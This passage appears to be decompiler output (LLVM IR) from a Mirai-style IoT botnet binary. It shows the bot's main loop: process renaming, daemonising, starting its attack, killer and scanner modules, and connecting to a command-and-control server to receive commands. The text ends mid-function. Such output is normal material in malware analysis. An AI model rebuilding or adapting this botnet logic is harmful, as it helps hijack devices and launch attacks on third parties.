dec_label_pc_dbd0:                                ; preds = %dec_label_pc_dcf8, %entry, %dec_label_pc_dd08
  %v0_dbd0 = call i32 @rand_next()
  store i32 %v0_dbd0, i32* @r6, align 4
  %v0_dbd8 = load i32, i32* @r8, align 4
  %v1_dbd8 = inttoptr i32 %v0_dbd8 to i32*
  %v2_dbd8 = load i32, i32* %v1_dbd8, align 4
  %v1_dbdc = inttoptr i32 %v2_dbd8 to i8*
  %v2_dbdc = call i32 @util_strlen(i8* %v1_dbdc)
  %v0_dbe4 = load i32, i32* @r8, align 4
  %v1_dbe4 = inttoptr i32 %v0_dbe4 to i32*
  %v2_dbe4 = load i32, i32* %v1_dbe4, align 4
  %v1_dbe8 = inttoptr i32 %v2_dbe4 to i8*
  %v2_dbe8 = call i32 @util_strlen(i8* %v1_dbe8)
  %v1_dbec = sub i32 20, %v2_dbdc
  %v0_dbf4 = load i32, i32* @r6, align 4
  %v3_dbf8 = urem i32 %v0_dbf4, %v1_dbec
  %v2_dbfc = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_dbfc, i32* @r5, align 4
  %v2_dc00 = add i32 %v3_dbf8, %v2_dbe8
  store i32 %v2_dc00, i32* @r4, align 4
  %v2_dc0c = call i32 @rand_alpha_str(i32 %v2_dbfc, i32 %v2_dc00)
  %v2_dc10 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_dc10, i32* @lr, align 4
  %v1_dc14 = load i32, i32* @r4, align 4
  %v2_dc14 = add i32 %v1_dc14, %v2_dc10
  store i32 %v2_dc14, i32* %r3.global-to-local, align 4
  store i32 0, i32* @sl, align 4
  %v0_dc20 = load i32, i32* @r8, align 4
  %v1_dc20 = inttoptr i32 %v0_dc20 to i32*
  %v2_dc20 = load i32, i32* %v1_dc20, align 4
  store i32 %v2_dc20, i32* @r0, align 4
  %v3_dc24 = add i32 %v2_dc14, -80
  %v4_dc24 = inttoptr i32 %v3_dc24 to i8*
  store i8 0, i8* %v4_dc24, align 1
  %v2_dc28 = inttoptr i32 %v2_dc20 to i8*
  %v3_dc28 = call i32 @util_strcpy(i8* %v2_dc28, i32 %v2_dbfc)
  store i32 32, i32* @r1, align 4
  store i32 %v2_dbfc, i32* @r0, align 4
  %v0_dc34 = call i32 @util_zero()
  %v0_dc38 = call i32 @rand_next()
  store i32 %v0_dc38, i32* @r7, align 4
  %v0_dc40 = load i32, i32* @r8, align 4
  %v1_dc40 = inttoptr i32 %v0_dc40 to i32*
  %v2_dc40 = load i32, i32* %v1_dc40, align 4
  %v1_dc44 = inttoptr i32 %v2_dc40 to i8*
  %v2_dc44 = call i32 @util_strlen(i8* %v1_dc44)
  store i32 %v2_dc44, i32* @r6, align 4
  %v0_dc4c = load i32, i32* @r8, align 4
  %v1_dc4c = inttoptr i32 %v0_dc4c to i32*
  %v2_dc4c = load i32, i32* %v1_dc4c, align 4
  %v1_dc50 = inttoptr i32 %v2_dc4c to i8*
  %v2_dc50 = call i32 @util_strlen(i8* %v1_dc50)
  %v0_dc54 = load i32, i32* @r6, align 4
  %v1_dc54 = sub i32 20, %v0_dc54
  %v0_dc5c = load i32, i32* @r7, align 4
  %v3_dc60 = urem i32 %v0_dc5c, %v1_dc54
  %v2_dc64 = add i32 %v3_dc60, %v2_dc50
  store i32 %v2_dc64, i32* @r4, align 4
  %v2_dc70 = call i32 @rand_alpha_str(i32 %v2_dbfc, i32 %v2_dc64)
  store i32 %v2_dc10, i32* %r2.global-to-local, align 4
  %v1_dc78 = load i32, i32* @r4, align 4
  %v2_dc78 = add i32 %v1_dc78, %v2_dc10
  store i32 %v2_dc78, i32* %r3.global-to-local, align 4
  %v0_dc7c = load i32, i32* @sl, align 4
  %v1_dc7c = trunc i32 %v0_dc7c to i8
  %v3_dc7c = add i32 %v2_dc78, -80
  %v4_dc7c = inttoptr i32 %v3_dc7c to i8*
  store i8 %v1_dc7c, i8* %v4_dc7c, align 1
  %v4_dc88 = call i32 @prctl(i32 15, i32 %v2_dbfc, i32 %v2_dc10, i32 %v2_dc78)
  %v1_dc90 = call i32 @table_unlock_val(i32 5)
  %v3_dca0 = call i32 @table_retrieve_val(i32 5, i32* nonnull %stack_var_-48)
  %v3_dca4 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_dca4, i32* @r2, align 4
  %v2_dcb0 = call i32 @__GI___libc_write(i32 1, i32 %v3_dca0)
  store i32 1, i32* @r2, align 4
  %v2_dcc0 = call i32 @__GI___libc_write(i32 1, i32 ptrtoint (i32* @global_var_19a6c.108 to i32))
  %v1_dcc8 = call i32 @table_lock_val(i32 5)
  %v1_dccc = call i32 @attack_init(i32 %v1_dcc8)
  %v1_dcd0 = call i32 @killer_init(i32 %v1_dccc)
  %v1_dcd4 = inttoptr i32 %v1_dcd0 to i32*
  %v2_dcd4 = call i32 @watchdog_maintain(i32* %v1_dcd4)
  %v0_dcd8 = call i32 @__libc_fork()
  %v1_dcdc = load i32, i32* @sl, align 4
  %v7_dce0 = icmp sgt i32 %v0_dcd8, %v1_dcdc
  br i1 %v7_dce0, label %dec_label_pc_dce4, label %dec_label_pc_dd30

dec_label_pc_dce4:                                ; preds = %dec_label_pc_dbd0
  ret i32 %v1_dcdc

dec_label_pc_dcf8:                                ; preds = %entry
  %v0_dcf8 = load i32, i32* @r8, align 4
  %v1_dcf8 = add i32 %v0_dcf8, 4
  %v2_dcf8 = inttoptr i32 %v1_dcf8 to i32*
  %v3_dcf8 = load i32, i32* %v2_dcf8, align 4
  %v1_dcfc = inttoptr i32 %v3_dcf8 to i8*
  %v2_dcfc = call i32 @util_strlen(i8* %v1_dcfc)
  %v8_dd04 = icmp sgt i32 %v2_dcfc, 31
  br i1 %v8_dd04, label %dec_label_pc_dbd0, label %dec_label_pc_dd08

dec_label_pc_dd08:                                ; preds = %dec_label_pc_dcf8
  %v0_dd08 = load i32, i32* @r8, align 4
  %v1_dd08 = add i32 %v0_dd08, 4
  %v2_dd08 = inttoptr i32 %v1_dd08 to i32*
  %v3_dd08 = load i32, i32* %v2_dd08, align 4
  store i32 %v2_dbac, i32* @r0, align 4
  %v2_dd10 = bitcast i32* %stack_var_-152 to i8*
  %v3_dd10 = call i32 @util_strcpy(i8* %v2_dd10, i32 %v3_dd08)
  %v0_dd14 = load i32, i32* @r8, align 4
  %v1_dd14 = add i32 %v0_dd14, 4
  %v2_dd14 = inttoptr i32 %v1_dd14 to i32*
  %v3_dd14 = load i32, i32* %v2_dd14, align 4
  %v1_dd1c = inttoptr i32 %v3_dd14 to i8*
  %v2_dd1c = call i32 @util_strlen(i8* %v1_dd1c)
  store i32 %v2_dd1c, i32* @r1, align 4
  store i32 %v3_dd14, i32* @r0, align 4
  %v0_dd28 = call i32 @util_zero()
  br label %dec_label_pc_dbd0

dec_label_pc_dd30:                                ; preds = %dec_label_pc_dbd0
  %v1_dd30 = call i32 @__GI_setsid(i32 %v0_dcd8)
  %v0_dd38 = load i32, i32* @sl, align 4
  %v1_dd3c = call i32 @__GI___libc_close(i32 %v0_dd38)
  %v1_dd44 = call i32 @__GI___libc_close(i32 1)
  %v1_dd4c = call i32 @__GI___libc_close(i32 2)
  store i32 ptrtoint (i32* @global_var_22280.110 to i32), i32* @fp, align 4
  %v1_dd54 = call i32 @attack_init(i32 %v1_dd4c)
  %v1_dd58 = call i32 @killer_init(i32 %v1_dd54)
  %v1_dd5c = inttoptr i32 %v1_dd58 to i32*
  %v2_dd5c = call i32 @watchdog_maintain(i32* %v1_dd5c)
  %v1_dd60 = call i32 @scanner_init(i32 %v2_dd5c)
  %v0_dd64 = load i32, i32* @sl, align 4
  %v2_dd68 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_dd68, i32* @r7, align 4
  %v2_dd6c = ptrtoint i32* %stack_var_-408 to i32
  store i32 %v2_dd6c, i32* @r6, align 4
  %v2_de4c = ptrtoint i32* %stack_var_-72 to i32
  %v2_de9c = ptrtoint i32* %stack_var_-168 to i32
  %v2_e078 = ptrtoint i32* %stack_var_-56 to i32
  %v2_e080 = ptrtoint i8** %stack_var_-42 to i32
  %v2_e228 = ptrtoint i32* %stack_var_-1432 to i32
  %v2_e09c = ptrtoint i32* %stack_var_-52 to i32
  %v1_e150 = bitcast i32* %stack_var_-152 to i8*
  %v2_e110 = ptrtoint i32* %stack_var_-88 to i32
  %v1_e12c = sub i32 0, %v1_dd30
  br label %dec_label_pc_dd70

dec_label_pc_dd70:                                ; preds = %dec_label_pc_e1b0, %dec_label_pc_e24c, %bb44, %dec_label_pc_e14c, %dec_label_pc_df80, %dec_label_pc_df70, %bb41, %dec_label_pc_e2a0, %dec_label_pc_e20c, %dec_label_pc_e1c0, %dec_label_pc_e19c, %dec_label_pc_e0c8, %dec_label_pc_dff0, %dec_label_pc_df28, %dec_label_pc_dd30
  %stack_var_-1436.0 = phi i32 [ %v0_dd64, %dec_label_pc_dd30 ], [ %stack_var_-1436.0, %bb41 ], [ %stack_var_-1436.1, %dec_label_pc_df70 ], [ %stack_var_-1436.1, %dec_label_pc_df80 ], [ %stack_var_-1436.1, %bb44 ], [ %stack_var_-1436.1, %dec_label_pc_e1c0 ], [ %stack_var_-1436.1, %dec_label_pc_dff0 ], [ %stack_var_-1436.1, %dec_label_pc_e24c ], [ %stack_var_-1436.1, %dec_label_pc_e2a0 ], [ %stack_var_-1436.1, %dec_label_pc_e20c ], [ %stack_var_-1436.1, %dec_label_pc_df28 ], [ %stack_var_-1436.1, %dec_label_pc_e14c ], [ %stack_var_-1436.1, %dec_label_pc_e19c ], [ %stack_var_-1436.1, %dec_label_pc_e0c8 ], [ %stack_var_-1436.1, %dec_label_pc_e1b0 ]
  store i32 0, i32* %stack_var_-280, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dd7c

dec_label_pc_dd7c:                                ; preds = %dec_label_pc_dd7c, %dec_label_pc_dd70
  %v1_dd80 = phi i32 [ %v1_dd84, %dec_label_pc_dd7c ], [ 4, %dec_label_pc_dd70 ]
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_dd80 = load i32, i32* @r7, align 4
  %v3_dd80 = add i32 %v2_dd80, %v1_dd80
  %v4_dd80 = inttoptr i32 %v3_dd80 to i32*
  store i32 0, i32* %v4_dd80, align 4
  %v0_dd84 = load i32, i32* %r3.global-to-local, align 4
  %v1_dd84 = add i32 %v0_dd84, 4
  store i32 %v1_dd84, i32* %r3.global-to-local, align 4
  %v7_dd88 = icmp eq i32 %v1_dd84, 128
  br i1 %v7_dd88, label %dec_label_pc_dd90, label %dec_label_pc_dd7c

dec_label_pc_dd90:                                ; preds = %dec_label_pc_dd7c
  %v0_dd90 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_dd90, i32* %stack_var_-408, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_dd98

dec_label_pc_dd98:                                ; preds = %dec_label_pc_dd98, %dec_label_pc_dd90
  %v1_dd9c = phi i32 [ %v1_dda0, %dec_label_pc_dd98 ], [ 4, %dec_label_pc_dd90 ]
  store i32 0, i32* @r4, align 4
  %v2_dd9c = load i32, i32* @r6, align 4
  %v3_dd9c = add i32 %v2_dd9c, %v1_dd9c
  %v4_dd9c = inttoptr i32 %v3_dd9c to i32*
  store i32 0, i32* %v4_dd9c, align 4
  %v0_dda0 = load i32, i32* %r3.global-to-local, align 4
  %v1_dda0 = add i32 %v0_dda0, 4
  store i32 %v1_dda0, i32* %r3.global-to-local, align 4
  %v7_dda4 = icmp eq i32 %v1_dda0, 128
  br i1 %v7_dda4, label %dec_label_pc_ddac, label %dec_label_pc_dd98

dec_label_pc_ddac:                                ; preds = %dec_label_pc_dd98
  store i32 ptrtoint (i32* @global_var_2227c.91 to i32), i32* %r3.global-to-local, align 4
  %v2_ddb0 = load i32, i32* @global_var_2227c.91, align 4
  %v7_ddb4 = icmp eq i32 %v2_ddb0, -1
  br i1 %v7_ddb4, label %dec_label_pc_dde0, label %dec_label_pc_ddbc

dec_label_pc_ddbc:                                ; preds = %dec_label_pc_ddac
  %v3_ddbc = udiv i32 %v2_ddb0, 32
  %v3_ddc0 = mul nuw nsw i32 %v3_ddbc, 4
  store i32 %v2_dc10, i32* %ip.global-to-local, align 4
  %v2_ddc8 = add i32 %v3_ddc0, %v2_dc10
  store i32 %v2_ddc8, i32* %r3.global-to-local, align 4
  %v1_ddcc = add i32 %v2_ddc8, -240
  %v2_ddcc = inttoptr i32 %v1_ddcc to i32*
  %v3_ddcc = load i32, i32* %v2_ddcc, align 4
  %v1_ddd0 = urem i32 %v2_ddb0, 32
  %v7_ddd8 = shl i32 1, %v1_ddd0
  %v8_ddd8 = or i32 %v3_ddcc, %v7_ddd8
  store i32 %v8_ddd8, i32* %r2.global-to-local, align 4
  store i32 %v8_ddd8, i32* %v2_ddcc, align 4
  br label %dec_label_pc_dde0

dec_label_pc_dde0:                                ; preds = %dec_label_pc_ddac, %dec_label_pc_ddbc
  %v2_dde0 = load i32, i32* @global_var_22280.110, align 4
  store i32 %v2_dde0, i32* @r3, align 4
  %v7_dde4 = icmp eq i32 %v2_dde0, -1
  store i32 ptrtoint (i32* @global_var_22280.110 to i32), i32* @r8, align 4
  br i1 %v7_dde4, label %dec_label_pc_e008, label %dec_label_pc_ddf0

dec_label_pc_ddf0:                                ; preds = %dec_label_pc_e008, %dec_label_pc_dde0, %bb43
  %v2_ddf4 = load i8, i8* bitcast (i8** @global_var_22400.113 to i8*), align 4
  %v2_ddf8 = icmp eq i8 %v2_ddf4, 0
  %v2_df44 = load i32, i32* @global_var_22280.110, align 4
  store i32 %v2_df44, i32* %ip.global-to-local, align 4
  %v3_df48 = udiv i32 %v2_df44, 32
  store i32 %v3_df48, i32* %r3.global-to-local, align 4
  br i1 %v2_ddf8, label %dec_label_pc_df44, label %dec_label_pc_de00

dec_label_pc_de00:                                ; preds = %dec_label_pc_ddf0
  %v3_de0c = mul nuw nsw i32 %v3_df48, 4
  %v2_de10 = add i32 %v3_de0c, %v2_dc10
  store i32 %v2_de10, i32* %r3.global-to-local, align 4
  %v1_de14 = add i32 %v2_de10, -368
  %v2_de14 = inttoptr i32 %v1_de14 to i32*
  %v3_de14 = load i32, i32* %v2_de14, align 4
  %v1_de18 = urem i32 %v2_df44, 32
  %v7_de20 = shl i32 1, %v1_de18
  %v8_de20 = or i32 %v3_de14, %v7_de20
  store i32 %v8_de20, i32* %r2.global-to-local, align 4
  store i32 %v8_de20, i32* %v2_de14, align 4
  br label %dec_label_pc_de28

dec_label_pc_de28:                                ; preds = %dec_label_pc_df44, %dec_label_pc_de00
  store i32 ptrtoint (i32* @global_var_2227c.91 to i32), i32* %r3.global-to-local, align 4
  %v2_de2c = load i32, i32* @global_var_2227c.91, align 4
  store i32 0, i32* @lr, align 4
  %v0_de34 = load i32, i32* %ip.global-to-local, align 4
  %v5_de38 = icmp slt i32 %v0_de34, %v2_de2c
  br i1 %v5_de38, label %bb41, label %bb

bb:                                               ; preds = %dec_label_pc_de28
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_de28, %bb
  %v0_de48 = phi i32 [ %v2_de2c, %dec_label_pc_de28 ], [ %v0_de34, %bb ]
  store i32 10, i32* %stack_var_-72, align 4
  %v1_de48 = add i32 %v0_de48, 1
  store i32 %v2_de4c, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %v2_dd6c, i32* %r2.global-to-local, align 4
  %v5_de64 = call i32 @__libc_select(i32 %v1_de48, i32 %v2_dd68, i32 %v2_dd6c, i32 0, i32 %v2_de4c)
  %v8_de68 = icmp eq i32 %v5_de64, -1
  br i1 %v8_de68, label %dec_label_pc_dd70, label %dec_label_pc_de70

dec_label_pc_de70:                                ; preds = %bb41
  %v6_de64 = trunc i32 %v5_de64 to i16
  %v3_de70 = icmp eq i16 %v6_de64, 0
  br i1 %v3_de70, label %dec_label_pc_de78, label %dec_label_pc_deac

dec_label_pc_de78:                                ; preds = %dec_label_pc_de70
  %v5_de84 = srem i32 %stack_var_-1436.0, 6
  %v4_de8c = sub i32 %stack_var_-1436.0, %v5_de84
  store i32 %v4_de8c, i32* %r3.global-to-local, align 4
  %v2_de94 = icmp eq i32 %v5_de84, 0
  %v1_de98 = add i32 %stack_var_-1436.0, 1
  store i32 %v1_de98, i32* @lr, align 4
  store i32 %v2_de9c, i32* %r2.global-to-local, align 4
  %v7_dea0 = inttoptr i32 %v5_de64 to i8*
  store i8* %v7_dea0, i8** %stack_var_-42, align 4
  br i1 %v2_de94, label %dec_label_pc_e078, label %dec_label_pc_deac

dec_label_pc_deac:                                ; preds = %dec_label_pc_de70, %dec_label_pc_de78, %dec_label_pc_e078
  %stack_var_-1436.1 = phi i32 [ %v1_de98, %dec_label_pc_e078 ], [ %v1_de98, %dec_label_pc_de78 ], [ %stack_var_-1436.0, %dec_label_pc_de70 ]
  store i32 ptrtoint (i32* @global_var_2227c.91 to i32), i32* %r3.global-to-local, align 4
  %v2_deb0 = load i32, i32* @global_var_2227c.91, align 4
  %v7_deb4 = icmp eq i32 %v2_deb0, -1
  br i1 %v7_deb4, label %dec_label_pc_dee0, label %dec_label_pc_debc

dec_label_pc_debc:                                ; preds = %dec_label_pc_deac
  %v3_debc = udiv i32 %v2_deb0, 32
  %v3_dec0 = mul nuw nsw i32 %v3_debc, 4
  store i32 %v2_dc10, i32* %ip.global-to-local, align 4
  %v2_dec8 = add i32 %v3_dec0, %v2_dc10
  store i32 %v2_dec8, i32* %r3.global-to-local, align 4
  %v1_decc = add i32 %v2_dec8, -240
  %v2_decc = inttoptr i32 %v1_decc to i32*
  %v3_decc = load i32, i32* %v2_decc, align 4
  %v1_ded0 = urem i32 %v2_deb0, 32
  %v6_ded4 = ashr i32 %v3_decc, %v1_ded0
  store i32 %v6_ded4, i32* %r2.global-to-local, align 4
  %v1_ded8 = urem i32 %v6_ded4, 2
  %v2_ded8 = icmp eq i32 %v1_ded8, 0
  br i1 %v2_ded8, label %dec_label_pc_dee0, label %dec_label_pc_e104

dec_label_pc_dee0:                                ; preds = %dec_label_pc_debc, %dec_label_pc_deac
  %v2_dee4 = load i8, i8* bitcast (i8** @global_var_22400.113 to i8*), align 4
  %v3_dee4 = zext i8 %v2_dee4 to i32
  store i32 %v3_dee4, i32* @r4, align 4
  %v2_dee8 = icmp eq i8 %v2_dee4, 0
  %v2_df70 = load i32, i32* @global_var_22280.110, align 4
  br i1 %v2_dee8, label %dec_label_pc_df70, label %dec_label_pc_def0

dec_label_pc_def0:                                ; preds = %dec_label_pc_dee0
  %v3_def4 = udiv i32 %v2_df70, 32
  store i32 %v2_dc10, i32* %r2.global-to-local, align 4
  %v3_defc = mul nuw nsw i32 %v3_def4, 4
  %v2_df00 = add i32 %v3_defc, %v2_dc10
  store i32 %v2_df00, i32* %r3.global-to-local, align 4
  %v1_df04 = add i32 %v2_df00, -368
  %v2_df04 = inttoptr i32 %v1_df04 to i32*
  %v3_df04 = load i32, i32* %v2_df04, align 4
  %v1_df08 = urem i32 %v2_df70, 32
  %v6_df0c = ashr i32 %v3_df04, %v1_df08
  store i32 %v6_df0c, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i8** @global_var_22400.113 to i32), i32* %r3.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v1_df18 = urem i32 %v6_df0c, 2
  %v2_df18 = icmp eq i32 %v1_df18, 0
  store i8 0, i8* bitcast (i8** @global_var_22400.113 to i8*), align 4
  store i32 ptrtoint (i32* @global_var_22280.110 to i32), i32* @r5, align 4
  br i1 %v2_df18, label %dec_label_pc_df28, label %dec_label_pc_e094

dec_label_pc_df28:                                ; preds = %dec_label_pc_def0
  store i32 57136, i32* @lr, align 4
  %v1_df2c = icmp ne i32 %v2_df70, -1
  call void @__pseudo_cond_branch(i1 %v1_df2c, i32 ptrtoint (i32* @global_var_14a50.115 to i32))
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_df34 = load i32, i32* @r5, align 4
  %v2_df34 = inttoptr i32 %v1_df34 to i32*
  store i32 -1, i32* %v2_df34, align 4
  %v1_df3c = call i32 @sleep(i32 1)
  br label %dec_label_pc_dd70

dec_label_pc_df44:                                ; preds = %dec_label_pc_ddf0
  store i32 %v2_dc10, i32* %r2.global-to-local, align 4
  %v3_df50 = mul nuw nsw i32 %v3_df48, 4
  %v2_df54 = add i32 %v3_df50, %v2_dc10
  store i32 %v2_df54, i32* %r3.global-to-local, align 4
  %v1_df58 = add i32 %v2_df54, -240
  %v2_df58 = inttoptr i32 %v1_df58 to i32*
  %v3_df58 = load i32, i32* %v2_df58, align 4
  %v1_df5c = urem i32 %v2_df44, 32
  %v7_df64 = shl i32 1, %v1_df5c
  %v8_df64 = or i32 %v3_df58, %v7_df64
  store i32 %v8_df64, i32* %r2.global-to-local, align 4
  store i32 %v8_df64, i32* %v2_df58, align 4
  br label %dec_label_pc_de28

dec_label_pc_df70:                                ; preds = %dec_label_pc_dee0
  %v7_df74 = icmp eq i32 %v2_df70, -1
  store i32 ptrtoint (i32* @global_var_22280.110 to i32), i32* @r8, align 4
  br i1 %v7_df74, label %dec_label_pc_dd70, label %dec_label_pc_df80

dec_label_pc_df80:                                ; preds = %dec_label_pc_df70
  %v3_df80 = udiv i32 %v2_df70, 32
  store i32 %v2_dc10, i32* %r2.global-to-local, align 4
  %v3_df88 = mul nuw nsw i32 %v3_df80, 4
  %v2_df8c = add i32 %v3_df88, %v2_dc10
  store i32 %v2_df8c, i32* %r3.global-to-local, align 4
  %v1_df90 = add i32 %v2_df8c, -240
  %v2_df90 = inttoptr i32 %v1_df90 to i32*
  %v3_df90 = load i32, i32* %v2_df90, align 4
  %v1_df94 = urem i32 %v2_df70, 32
  %v6_df98 = ashr i32 %v3_df90, %v1_df94
  store i32 %v6_df98, i32* %r2.global-to-local, align 4
  %v1_df9c = urem i32 %v6_df98, 2
  %v2_df9c = icmp eq i32 %v1_df9c, 0
  br i1 %v2_df9c, label %dec_label_pc_dd70, label %dec_label_pc_dfa4

dec_label_pc_dfa4:                                ; preds = %dec_label_pc_df80
  %v6_dfa8 = inttoptr i32 %v3_dee4 to i8*
  store i8* %v6_dfa8, i8** %stack_var_-42, align 4
  store i32 %v2_e080, i32* @sl, align 4
  %v0_dfac = call i32 @__GI___errno_location()
  %v0_dfb0 = load i32, i32* @r4, align 4
  %v2_dfb0 = inttoptr i32 %v0_dfac to i32*
  store i32 %v0_dfb0, i32* %v2_dfb0, align 4
  store i32 %v0_dfac, i32* @r5, align 4
  store i32 16386, i32* %r3.global-to-local, align 4
  %v2_dfc0 = load i32, i32* @global_var_22280.110, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v4_dfcc = call i32 @__libc_recv(i32 %v2_dfc0, i32 %v2_e080, i32 2, i32 16386)
  %v7_dfd0 = icmp eq i32 %v4_dfcc, -1
  br i1 %v7_dfd0, label %dec_label_pc_e1b0, label %dec_label_pc_dfd8

dec_label_pc_dfd8:                                ; preds = %dec_label_pc_dfa4
  %v2_dfd8 = icmp eq i32 %v4_dfcc, 0
  br i1 %v2_dfd8, label %dec_label_pc_e1c0, label %dec_label_pc_dfe0

dec_label_pc_dfe0:                                ; preds = %dec_label_pc_dfd8
  store i32 %v2_de9c, i32* %ip.global-to-local, align 4
  %v3_dfe4 = load i8*, i8** %stack_var_-42, align 4
  %v4_dfe4 = ptrtoint i8* %v3_dfe4 to i32
  store i32 %v4_dfe4, i32* %r3.global-to-local, align 4
  %v2_dfe8 = icmp eq i8* %v3_dfe4, null
  br i1 %v2_dfe8, label %dec_label_pc_dff0, label %dec_label_pc_e1f0

dec_label_pc_dff0:                                ; preds = %dec_label_pc_dfe0
  %v2_dff0 = load i32, i32* @global_var_22280.110, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_dffc = add i32 %v4_dfe4, 16384
  store i32 %v1_dffc, i32* %r3.global-to-local, align 4
  %v4_e000 = call i32 @__libc_recv(i32 %v2_dff0, i32 %v2_e080, i32 2, i32 %v1_dffc)
  br label %dec_label_pc_dd70

dec_label_pc_e008:                                ; preds = %dec_label_pc_dde0
  %v0_e010 = load i32, i32* @r4, align 4
  store i32 %v0_e010, i32* %r2.global-to-local, align 4
  %v3_e014 = call i32 @socket(i32 2, i32 1, i32 %v0_e010)
  %v7_e018 = icmp eq i32 %v3_e014, -1
  store i32 %v3_e014, i32* @r5, align 4
  %v1_e020 = load i32, i32* @r8, align 4
  %v2_e020 = inttoptr i32 %v1_e020 to i32*
  store i32 %v3_e014, i32* %v2_e020, align 4
  br i1 %v7_e018, label %dec_label_pc_ddf0, label %dec_label_pc_e028

dec_label_pc_e028:                                ; preds = %dec_label_pc_e008
  %v0_e028 = load i32, i32* @r4, align 4
  store i32 %v0_e028, i32* @r2, align 4
  %v2_e030 = call i32 @__libc_fcntl(i32 %v3_e014, i32 3)
  %v1_e038 = or i32 %v2_e030, 2048
  store i32 %v1_e038, i32* @r2, align 4
  %v0_e03c = load i32, i32* @r5, align 4
  %v2_e040 = call i32 @__libc_fcntl(i32 %v0_e03c, i32 4)
  %v2_e048 = load i32, i32* @global_var_22284.89, align 4
  store i32 %v2_e048, i32* %r3.global-to-local, align 4
  %v2_e04c = icmp eq i32 %v2_e048, 0
  br i1 %v2_e04c, label %bb43, label %bb42

bb42:                                             ; preds = %dec_label_pc_e028
  br label %bb43

bb43:                                             ; preds = %dec_label_pc_e028, %bb42
  %v2_e054 = xor i1 %v2_e04c, true
  call void @__pseudo_cond_branch(i1 %v2_e054, i32 ptrtoint (i32* @global_var_10e10.116 to i32))
  store i32 ptrtoint (i8** @global_var_22400.113 to i32), i32* %ip.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v2_e060 = load i32, i32* @global_var_22280.110, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i8 1, i8* bitcast (i8** @global_var_22400.113 to i8*), align 4
  %v4_e070 = call i32 @__libc_connect(i32 %v2_e060, i32 ptrtoint (i16** @global_var_24f1c.96 to i32), i32 16)
  br label %dec_label_pc_ddf0

dec_label_pc_e078:                                ; preds = %dec_label_pc_de78
  %v2_e07c = load i32, i32* @global_var_22280.110, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v5_e08c = call i32 @__libc_send(i32 %v2_e07c, i32 %v2_e080, i32 2, i32 16384)
  br label %dec_label_pc_deac

dec_label_pc_e094:                                ; preds = %dec_label_pc_def0
  store i32 4, i32* @r4, align 4
  store i32 %v2_e09c, i32* %r3.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  store i32 1, i32* @r1, align 4
  store i32 %v2_e078, i32* %ip.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 4, i32* %stack_var_-56, align 4
  %v5_e0b8 = call i32 @getsockopt(i32 %v2_df70, i32 1, i32 4, i32 %v2_e09c, i32 %v2_e078)
  %v3_e0bc = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e0bc, i32* %r3.global-to-local, align 4
  %v2_e0c0 = icmp eq i32 %v3_e0bc, 0
  br i1 %v2_e0c0, label %dec_label_pc_e14c, label %dec_label_pc_e0c8

dec_label_pc_e0c8:                                ; preds = %dec_label_pc_e094
  %v2_e0c8 = load i32, i32* @global_var_22280.110, align 4
  %v1_e0cc = call i32 @__GI___libc_close(i32 %v2_e0c8)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v1_e0d4 = load i32, i32* @r5, align 4
  %v2_e0d4 = inttoptr i32 %v1_e0d4 to i32*
  store i32 -1, i32* %v2_e0d4, align 4
  %v0_e0d8 = call i32 @rand_next()
  %v3_e0e0 = zext i32 %v0_e0d8 to i64
  %v4_e0e0 = mul nuw i64 %v3_e0e0, 3435973837
  %v7_e0e0 = trunc i64 %v4_e0e0 to i32
  store i32 %v7_e0e0, i32* %ip.global-to-local, align 4
  %v3_e0e42 = udiv i64 %v4_e0e0, 34359738368
  %v3_e0e84 = mul nuw nsw i64 %v3_e0e42, 8
  %v3_e0e8 = trunc i64 %v3_e0e84 to i32
  store i32 %v3_e0e8, i32* %r2.global-to-local, align 4
  %v2_e0ec6 = mul nuw nsw i64 %v3_e0e42, 2
  %v2_e0ec = trunc i64 %v2_e0ec6 to i32
  %v2_e0f0 = add i32 %v3_e0e8, %v2_e0ec
  store i32 %v2_e0f0, i32* %r3.global-to-local, align 4
  %v2_e0f4 = sub i32 %v0_e0d8, %v2_e0f0
  %v1_e0f8 = add i32 %v2_e0f4, 1
  %v1_e0fc = call i32 @sleep(i32 %v1_e0f8)
  br label %dec_label_pc_dd70

dec_label_pc_e104:                                ; preds = %dec_label_pc_debc
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 %v2_e09c, i32* %r2.global-to-local, align 4
  store i32 16, i32* %stack_var_-52, align 4
  %v5_e118 = call i32 @__libc_accept(i32 %v2_deb0, i32 %v2_e110, i32 %v2_e09c, i32 16, i32 16)
  %v1_e11c = call i32 @scanner_kill(i32 %v5_e118)
  %v1_e120 = call i32 @killer_kill(i32 %v1_e11c)
  %v2_e130 = call i32 @kill(i32 %v1_e12c, i32 9)
  store i32 ptrtoint (i32* @global_var_223fc.100 to i32), i32* %r3.global-to-local, align 4
  %v2_e138 = load i32, i32* @global_var_223fc.100, align 4
  %v2_e13c = icmp eq i32 %v2_e138, 0
  br i1 %v2_e13c, label %dec_label_pc_e144, label %dec_label_pc_e1e4

dec_label_pc_e144:                                ; preds = %dec_label_pc_e104, %dec_label_pc_e1e4
  %v1_e148 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_e14c

dec_label_pc_e14c:                                ; preds = %dec_label_pc_e094, %dec_label_pc_e144
